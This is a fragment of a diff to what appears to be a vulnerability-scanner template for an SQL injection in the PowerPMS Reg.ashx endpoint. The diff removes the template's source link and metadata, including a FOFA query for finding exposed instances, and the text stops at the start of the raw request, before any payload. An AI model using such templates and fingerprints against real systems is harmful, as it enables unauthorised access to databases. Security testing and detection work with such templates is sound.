@@ -3,12 +3,8 @@ info:
   name: 普华科技 PowerPMS Reg.ashx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/igi7188mzmvx6o31'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: igi7188mzmvx6o31
-    fofa: body="Power.login.init"&&body="Power.ui.warning" && body="Power_login_btn"
 http:
 - raw:
   - 'POST /weixin3.0/Reg.ashx HTTP/1.1
